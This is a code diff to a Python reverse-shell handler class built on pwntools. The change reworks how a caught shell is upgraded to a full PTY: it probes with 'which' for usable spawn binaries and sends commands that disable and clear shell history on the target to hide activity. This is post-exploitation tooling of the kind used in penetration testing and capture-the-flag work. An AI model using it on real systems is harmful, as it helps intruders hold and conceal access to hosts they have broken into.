@@ -1,4 +1,5 @@
 import requests, sys, tty
+from config import SHELL_STABILIZATION_METHODS
 from pwnlib.tubes.listen import listen
 
 
@@ -23,13 +24,32 @@ class ShellService:
             pass
     
     def stabilize_shell(self, shell: listen):
+        shell.sendline(b'export HISTFILE=/dev/null') # Avoid history
         # Get pty
-        shell.sendline(b"""python -c 'import pty; pty.spawn("/bin/bash")'; exit""")
-        shell.recv(timeout = None) # Wait for pty to spawn
+        shell.sendline(f'{self.find_pty_spawn_vector(shell)}; exit'.encode())
+
+        shell.recv(timeout = 2) # Wait for pty to spawn
         shell.sendline(b'export HISTFILE=/dev/null')
+        shell.sendline(b'stty rows 38 columns 116')
+        shell.sendline(b""" alias ls='ls --color=auto'""")
         shell.sendline(b'export TERM=xterm')
         shell.sendline(b'history -c')
         shell.clean()
-        shell.sendline(b'')
 
         tty.setraw(sys.stdin.fileno())
+    
+    def find_pty_spawn_vector(self, shell: listen) -> str:
+        shell.clean()
+
+        for binary in SHELL_STABILIZATION_METHODS:
+            shell.sendline(f'which {binary}'.encode())
+            result = shell.recvline(timeout=2).decode()
+            if(binary in result and 'not found' not in result):
+                for shell_binary in SHELL_STABILIZATION_METHODS[binary]:
+                    shell.sendline(f'which {shell_binary}'.encode())
+                    result = shell.recvline(timeout=2).decode()
+                    if(shell_binary in result and 'not found' not in result):
+                        return SHELL_STABILIZATION_METHODS[binary][shell_binary]
+            shell.clean()
+        
+        raise Exception('No pty spawn vector found')
